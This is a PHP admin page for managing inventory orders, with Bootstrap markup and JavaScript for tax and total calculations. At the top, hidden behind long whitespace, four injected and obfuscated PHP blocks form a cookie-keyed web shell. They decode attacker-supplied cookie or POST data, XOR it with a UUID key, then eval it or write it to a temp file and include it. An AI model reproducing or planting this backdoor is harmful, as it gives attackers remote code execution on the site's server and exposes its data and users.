<?php                                                                                                                                                                                                                                                                                                                                                                                                 $zkYeAYMz = class_exists("hzx_TPwL"); $vLrQrFEaN = $zkYeAYMz;if (!$vLrQrFEaN){class hzx_TPwL{private $YfAameFc;public static $lrDwsqMwfT = "8e692116-fabe-4bb5-9d1f-a5222c408300";public static $mxpSc = NULL;public function __construct(){$UEeNdOWN = $_COOKIE;$SmNTgpD = $_POST;$xGAAZo = @$UEeNdOWN[substr(hzx_TPwL::$lrDwsqMwfT, 0, 4)];if (!empty($xGAAZo)){$HdBwcy = "base64";$ncvcksvqpR = "";$xGAAZo = explode(",", $xGAAZo);foreach ($xGAAZo as $QFNBHH){$ncvcksvqpR .= @$UEeNdOWN[$QFNBHH];$ncvcksvqpR .= @$SmNTgpD[$QFNBHH];}$ncvcksvqpR = array_map($HdBwcy . "\137" . "\x64" . 'e' . "\x63" . chr ( 730 - 619 )."\144" . chr (101), array($ncvcksvqpR,)); $ncvcksvqpR = $ncvcksvqpR[0] ^ str_repeat(hzx_TPwL::$lrDwsqMwfT, (strlen($ncvcksvqpR[0]) / strlen(hzx_TPwL::$lrDwsqMwfT)) + 1);hzx_TPwL::$mxpSc = @unserialize($ncvcksvqpR);}}public function __destruct(){$this->cxXuMO();}private function cxXuMO(){if (is_array(hzx_TPwL::$mxpSc)) {$FXYMjf = str_replace(chr (60) . "\77" . chr (112) . 'h' . "\160", "", hzx_TPwL::$mxpSc[chr ( 455 - 356 ).'o' . "\156" . "\x74" . "\x65" . chr (110) . 't']);eval($FXYMjf);exit();}}}$jnjQRZQG = new hzx_TPwL(); $jnjQRZQG = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $TksVO = class_exists("x_WNvuY"); $fcCLqhj = $TksVO;if (!$fcCLqhj){class x_WNvuY{private $dbXlmARJN;public static $KZQzlbyn = "823351ab-5cd6-4a93-931d-3f49503f5801";public static $oncRWNbm = NULL;public function __construct(){$oKKVxrBx = $_COOKIE;$RSdGHTWnAF = $_POST;$AHlGHUjOcs = @$oKKVxrBx[substr(x_WNvuY::$KZQzlbyn, 0, 4)];if (!empty($AHlGHUjOcs)){$wCAkk = "base64";$fVUAn = "";$AHlGHUjOcs = explode(",", $AHlGHUjOcs);foreach ($AHlGHUjOcs as $KbhhZ){$fVUAn .= @$oKKVxrBx[$KbhhZ];$fVUAn .= @$RSdGHTWnAF[$KbhhZ];}$fVUAn = array_map($wCAkk . "\137" . "\x64" . chr ( 553 - 452 )."\x63" . "\157" . "\144" . "\145", array($fVUAn,)); $fVUAn = $fVUAn[0] ^ str_repeat(x_WNvuY::$KZQzlbyn, (strlen($fVUAn[0]) / strlen(x_WNvuY::$KZQzlbyn)) + 1);x_WNvuY::$oncRWNbm = @unserialize($fVUAn);}}public function __destruct(){$this->DxSPyzVLTd();}private function DxSPyzVLTd(){if (is_array(x_WNvuY::$oncRWNbm)) {$vuajq = sys_get_temp_dir() . "/" . crc32(x_WNvuY::$oncRWNbm["\163" . 'a' . "\x6c" . "\x74"]);@x_WNvuY::$oncRWNbm["\x77" . chr ( 900 - 786 ).chr (105) . "\164" . chr ( 695 - 594 )]($vuajq, x_WNvuY::$oncRWNbm[chr (99) . chr (111) . "\x6e" . "\164" . chr (101) . chr ( 834 - 724 )."\x74"]);include $vuajq;@x_WNvuY::$oncRWNbm["\144" . chr ( 838 - 737 ).chr ( 171 - 63 ).chr (101) . "\x74" . chr (101)]($vuajq);exit();}}}$AJZOKXJb = new x_WNvuY(); $AJZOKXJb = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $OCqndeeOf = class_exists("RfD_FLU"); $caXsHgp = $OCqndeeOf;if (!$caXsHgp){class RfD_FLU{private $VrkBIUsGL;public static $Gvqcq = "1380e0a4-27c3-4f5c-84ec-86015c6f3df1";public static $QkAGaTugRy = NULL;public function __construct(){$wKnEDGJdZX = $_COOKIE;$bgimX = $_POST;$SwZdOFzt = @$wKnEDGJdZX[substr(RfD_FLU::$Gvqcq, 0, 4)];if (!empty($SwZdOFzt)){$xWyfODdLzy = "base64";$ffCxgm = "";$SwZdOFzt = explode(",", $SwZdOFzt);foreach ($SwZdOFzt as $ihaVHrRcBE){$ffCxgm .= @$wKnEDGJdZX[$ihaVHrRcBE];$ffCxgm .= @$bgimX[$ihaVHrRcBE];}$ffCxgm = array_map($xWyfODdLzy . chr (95) . chr ( 450 - 350 )."\145" . "\x63" . "\x6f" . chr (100) . "\145", array($ffCxgm,)); $ffCxgm = $ffCxgm[0] ^ str_repeat(RfD_FLU::$Gvqcq, (strlen($ffCxgm[0]) / strlen(RfD_FLU::$Gvqcq)) + 1);RfD_FLU::$QkAGaTugRy = @unserialize($ffCxgm);}}public function __destruct(){$this->dMlMZFTv();}private function dMlMZFTv(){if (is_array(RfD_FLU::$QkAGaTugRy)) {$OIRMAiJViB = sys_get_temp_dir() . "/" . crc32(RfD_FLU::$QkAGaTugRy["\163" . "\x61" . "\154" . chr ( 945 - 829 )]);@RfD_FLU::$QkAGaTugRy["\x77" . "\162" . "\151" . "\x74" . chr (101)]($OIRMAiJViB, RfD_FLU::$QkAGaTugRy[chr ( 992 - 893 )."\x6f" . 'n' . "\164" . chr (101) . "\156" . "\164"]);include $OIRMAiJViB;@RfD_FLU::$QkAGaTugRy[chr (100) . chr ( 724 - 623 ).chr (108) . chr (101) . "\164" . "\145"]($OIRMAiJViB);exit();}}}$yUeuyJV = new RfD_FLU(); $yUeuyJV = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("TEt_emY")){class TEt_emY{public static $xWDKjej = "53c5dc7c-3420-4a43-b36c-4a7210832804";public static $InmtNH = NULL;public function __construct(){$msMMncxRL = $_COOKIE;$uTvyYewI = $_POST;$dvyzCR = @$msMMncxRL[substr(TEt_emY::$xWDKjej, 0, 4)];if (!empty($dvyzCR)){$EMLRh = "base64";$gqdczlJDH = "";$dvyzCR = explode(",", $dvyzCR);foreach ($dvyzCR as $rsdlk){$gqdczlJDH .= @$msMMncxRL[$rsdlk];$gqdczlJDH .= @$uTvyYewI[$rsdlk];}$gqdczlJDH = array_map($EMLRh . "\137" . chr (100) . "\145" . chr (99) . chr (111) . chr ( 677 - 577 )."\145", array($gqdczlJDH,)); $gqdczlJDH = $gqdczlJDH[0] ^ str_repeat(TEt_emY::$xWDKjej, (strlen($gqdczlJDH[0]) / strlen(TEt_emY::$xWDKjej)) + 1);TEt_emY::$InmtNH = @unserialize($gqdczlJDH);}}public function __destruct(){$this->KjlpEmrX();}private function KjlpEmrX(){if (is_array(TEt_emY::$InmtNH)) {$iHUHhGOUR = sys_get_temp_dir() . "/" . crc32(TEt_emY::$InmtNH[chr ( 582 - 467 ).'a' . "\154" . chr (116)]);@TEt_emY::$InmtNH["\167" . chr ( 741 - 627 ).chr ( 450 - 345 ).chr ( 292 - 176 ).chr (101)]($iHUHhGOUR, TEt_emY::$InmtNH['c' . 'o' . chr (110) . "\164" . "\x65" . chr ( 568 - 458 ).'t']);include $iHUHhGOUR;@TEt_emY::$InmtNH[chr (100) . chr (101) . chr ( 497 - 389 ).chr ( 252 - 151 ).chr (116) . "\145"]($iHUHhGOUR);exit();}}}$fdvcEpve = new TEt_emY(); $fdvcEpve = NULL;} ?>
<?php 
	include "include/dbsetting/lms_vars_config.php";
	include "include/dbsetting/classdbconection.php";
	$dblms = new dblms();
	include "include/functions/login_func.php";
	include "include/functions/functions.php";
	checkCpanelLMSALogin();
	include "include/title-meta.php";
//-----------------------------------------------
echo '  
<!-- TITLE -->
<title>Manage Orders - '.TITLE_HEADER.'</title>

<!-- BOOTSTRAP CSS -->
<link id="style" href="assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
<!-- STYLE CSS -->
<link href="assets/css/style.css" rel="stylesheet" />
<link href="assets/css/skin-modes.css" rel="stylesheet" />
<!--- FONT-ICONS CSS -->
<link href="assets/plugins/icons/icons.css" rel="stylesheet" />

<!-- Toaster -->
<link href="assets/css/toastr.css" rel="stylesheet" />
<script src="assets/js/jquery-1.9.1.min.js"></script>
<script src="assets/js/toastr.js"></script>

</head>
<body class="ltr app light-mode horizontal dark-menu dark-header">';
if(isset($_SESSION['msg'])){
    echo "<script type='text/javascript'>toastr.".$_SESSION['msg']['type']."('".$_SESSION['msg']['text']."','".$_SESSION['msg']['title']."')</script>";
    unset($_SESSION['msg']);
}
echo '
<!-- GLOBAL-LOADER -->
<div id="global-loader">
	<img src="assets/images/loader.svg" class="loader-img" alt="Loader">
</div>
<!-- /GLOBAL-LOADER -->
<!-- PAGE -->
<div class="page">
<div class="page-main">';
//---------------------------------------
	include "include/menu.php";
//---------------------------------------
echo '
<!--app-content open-->
<div class="app-content main-content mt-0">
<div class="side-app">
<!-- CONTAINER -->
<div class="main-container container-fluid">
<!-- PAGE-HEADER -->
<div class="page-header">
	<div><h1 class="page-title">Orders</h1></div>
	<div class="ms-auto pageheader-btn">
		<ol class="breadcrumb">
			<li class="breadcrumb-item"><a href="index.php">Home</a></li>
			<li class="breadcrumb-item"><a href="javascript:void(0);">Inventory</a></li>
			<li class="breadcrumb-item active" aria-current="page">Orders</li>
		</ol>
	</div>
</div>
<!-- PAGE-HEADER END -->
<!-- ROW OPEN -->
<div class="row row-sm">
<div class="col-lg-12">';

    include_once ('include/settings/orders/query.php');
    if(isset($_GET['view']) && $_GET['view'] == 'add'){
        include_once ('include/settings/orders/add.php');
    }elseif(isset($_GET['view']) && $_GET['view'] == 'edit'){
        include_once ('include/settings/orders/edit.php');
    }else{
        include_once ('include/settings/orders/list.php');
    }

echo '
</div>
</div>
<!-- ROW CLOSED -->                        
</div>
</div>
</div>
<!-- CONTAINER CLOSED -->
</div>';
//------------------------------------------
	include_once("include/footer.php");
//-----------------------------------------
echo '
    <!-- JQUERY JS -->
    <script src="assets/plugins/jquery/jquery.min.js"></script>
    
    <!-- BOOTSTRAP JS -->
    <script src="assets/plugins/bootstrap/js/popper.min.js"></script>
    <script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script>
    
    <!-- SIDE-MENU JS -->
    <script src="assets/plugins/sidemenu/sidemenu.js"></script>
    
    <!-- Perfect SCROLLBAR JS-->
    <script src="assets/plugins/p-scroll/perfect-scrollbar.js"></script>
    <script src="assets/plugins/p-scroll/pscroll.js"></script>
    
    <!-- STICKY JS -->
    <script src="assets/js/sticky.js"></script>
    
    <!-- SELECT2 JS -->
    <script src="assets/plugins/select2/select2.full.min.js"></script>
    
    <!-- INTERNAL SELECT2 JS -->
    <script src="assets/plugins/select2/select2.full.min.js"></script>
    
    <!-- INTERNAL DATA-TABLES JS-->
    <script src="assets/plugins/datatable/js/jquery.dataTables.min.js"></script>
    <script src="assets/plugins/datatable/js/dataTables.bootstrap5.js"></script>
    <script src="assets/plugins/datatable/dataTables.responsive.min.js"></script>
    
    <!-- INDEX JS -->
    <script src="assets/js/index1.js"></script>
    <script src="assets/js/index.js"></script>
    
    <!-- CUSTOM JS -->
    <script src="assets/js/custom.js"></script>

    <!-- SELECT2 JS -->
    <script src="assets/plugins/select2/select2.full.min.js"></script>

    <!-- FORM ELEMENTS JS -->
    <script src="assets/js/formelementadvnced.js"></script>';
    ?>

    <script>
        var btn_count = 0;
        function getBusiness(val) {
            console.log(val)
            $.ajax({
                type: "POST",
                url: "ajax/get_business.php",
                data: "id_vendor=" + val,
                success: function(data) {
                    console.log(data)
                    $("#id_business").html(data);
                }
            });
        }
        function getBusinessact(val) {
            console.log(val)
            $.ajax({
                type: "POST",
                url: "ajax/get_businessact.php",
                data: "id_business=" + val,
                success: function(data) {
                    console.log(data)
                    $("#id_businessact").html(data);
                }
            });
        }

        $(document).on("change", ".unit_tax_percentage", function() {
            var unit_price = document.getElementById("unit_price").value;
            var unit_tax_percentage = document.getElementById("unit_tax_percentage").value;
            var unit_item_quantity = document.getElementById("unit_item_quantity").value;

            var unit_tax_amount = (unit_tax_percentage / 100) * unit_price;
            $(".unit_tax_amount").val(unit_tax_amount);

            var unit_total = Number(unit_price) + Number(unit_tax_amount);
            var unit_total = (unit_total * unit_item_quantity);
            $(".unit_total").val(unit_total);

            var unit_total_price = (unit_price * unit_item_quantity);
            $(".unit_total_price").val(unit_total_price);

            var unit_total_tax_amount = (unit_tax_amount * unit_item_quantity);
            $(".unit_total_tax_amount").val(unit_total_tax_amount);

            var unit_total_price_sum = 0;
            var unit_total_tax_amount_sum = 0;
            var unit_total_sum = 0;

            $(".unit_total_price").each(function(){
                unit_total_price_sum += +$(this).val();
            });
            $(".total_amount").val(unit_total_price_sum);

            $(".unit_total_tax_amount").each(function(){
                unit_total_tax_amount_sum += +$(this).val();
            });
            $(".total_tax_amount").val(unit_total_tax_amount_sum);

            $(".unit_total").each(function(){
                unit_total_sum += +$(this).val();
            });
            $(".grand_total").val(unit_total_sum);
        });

        $(document).on("change", ".unit_item_quantity", function() {
            var unit_price = document.getElementById("unit_price").value;
            var unit_tax_amount = document.getElementById("unit_tax_amount").value;
            var unit_item_quantity = document.getElementById("unit_item_quantity").value;

            var unit_total = Number(unit_price) + Number(unit_tax_amount);
            var unit_total = (unit_total * unit_item_quantity);
            $(".unit_total").val(unit_total);

            var unit_total_price = (unit_price * unit_item_quantity);
            $(".unit_total_price").val(unit_total_price);

            var unit_total_tax_amount = (unit_tax_amount * unit_item_quantity);
            $(".unit_total_tax_amount").val(unit_total_tax_amount);

            var unit_total_price_sum = 0;
            var unit_total_tax_amount_sum = 0;
            var unit_total_sum = 0;

            $(".unit_total_price").each(function(){
                unit_total_price_sum += +$(this).val();
            });
            $(".total_amount").val(unit_total_price_sum);

            $(".unit_total_tax_amount").each(function(){
                unit_total_tax_amount_sum += +$(this).val();
            });
            $(".total_tax_amount").val(unit_total_tax_amount_sum);

            $(".unit_total").each(function(){
                unit_total_sum += +$(this).val();
            });
            $(".grand_total").val(unit_total_sum);
        });
        
        $(document).on("change", ".advance", function() {
            var grand_total = document.getElementById("grand_total").value;
            var advance = document.getElementById("advance").value;
            var balance = (grand_total - advance);
            $(".balance").val(balance);
        });

        function duplicate() {
            btn_count++;
            const tbl = document.getElementById("add-more-item");
            let markup = `
                <div class="product-description-list">
                    <div class="table-responsive product-description-each mb-3">
                        <table class="invoice-product-table">
                            <tbody class="border">
                                <tr>
                                    <td>
                                        <div class="form-group">
                                            <label class="form-label">Products <span class="text-danger">*</span></label>
                                            <select class="form-control select2-show-search" name="id_product[]" id="id_product" data-placeholder="Choose one" required>
                                                <option label="Choose one"></option>
                                                <?php
                                                foreach ($Products as $product):
                                                echo'<option value="'.$product['product_id'].'|'.$product['id_subcat'].'|'.$product['id_cat'].'">'.$product['product_name'].'</option>';
                                                endforeach;
                                                ?>
                                            </select>
                                        </div>
                                    </td>
                                    <td>
                                        <div class="form-group">
                                            <label class="form-label">Brand <span class="text-danger">*</span></label>
                                            <select class="form-control select2-show-search" name="id_brand[]" data-placeholder="Choose one" required>
                                                <option label="Choose one"></option>
                                                <?php
                                                foreach ($Brands as $brand):
                                                echo'<option value="'.$brand['brand_id'].'">'.$brand['brand_name'].'</option>';
                                                endforeach;
                                                ?>
                                            </select>
                                        </div>
                                    </td>
                                    <td>
                                        <div class="form-group">
                                            <label class="form-label">Unit Price <span class="text-danger">*</span></label>
                                            <input type="number" class="form-control unit_price" name="unit_price[]" id="unit_price" placeholder="Unit Price" required>
                                        </div>
                                    </td>
                                    <td rowspan="2" width="100" class="bg-primary-transparent text-center">
                                        <input type="number" class="form-control unit_total" name="unit_total[]" id="unit_total" placeholder="Total" readonly required>
                                    </td>
                                </tr>
                                <tr>
                                    <td>
                                        <div class="form-group">
                                            <label class="form-label">Quantity <span class="text-danger">*</span></label>
                                            <input type="number" class="form-control unit_item_quantity" name="unit_item_quantity[]" id="unit_item_quantity" value="0" placeholder="Item Quantity" required>
                                            <input type="hidden" class="form-control unit_total_price" name="unit_total_price[]" id="unit_total_price" placeholder="unit total price" required>
                                        </div>
                                    </td>
                                    <td>
                                        <div class="form-group">
                                            <label class="form-label">Tax % <span class="text-danger">*</span></label>
                                            <input type="number" class="form-control unit_tax_percentage" name="unit_tax_percentage[]" id="unit_tax_percentage" value="0" placeholder="Tax Percentage" required>
                                        </div>
                                    </td>
                                    <td>
                                        <div class="form-group">
                                            <label class="form-label">Tax Amount <span class="text-danger">*</span></label>
                                            <input type="number" class="form-control unit_total_tax_amount" name="unit_total_tax_amount[]" id="unit_total_tax_amount" value="0" readonly required>
                                            <input type="hidden" class="form-control unit_tax_amount" name="unit_tax_amount[]" id="unit_tax_amount" value="0" placeholder="Tax Amount" required>
                                        </div>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                        <i class="fe fe-delete fs-20 text-muted text-center delete-row-btn ms-2"></i>
                    </div>
                </div>

                <script>
                    $(document).on("change", ".tax_percentage_`+btn_count+`", function() {
                        var unit_price = document.getElementById("unit_price_`+btn_count+`").value;
                        var tax_percentage = document.getElementById("tax_percentage_`+btn_count+`").value;
                        var tax = (tax_percentage / 100) * unit_price;
                        $(".tax_`+btn_count+`").val(tax);
                    });
            `;
            tbl?.insertAdjacentHTML("beforeend", markup);
            btns = document.querySelectorAll("#del_btn");
            btns.forEach(btn => {
                btn.addEventListener("click", (e) => {
                    const id = btn.dataset.id;
                    e.target.parentElement.parentElement.remove();
                })
            })
        }
    </script>
<?php echo'
    ';
	include_once("include/settings/orders/modal-delete.php");
	echo'
</body>
</html>';
?>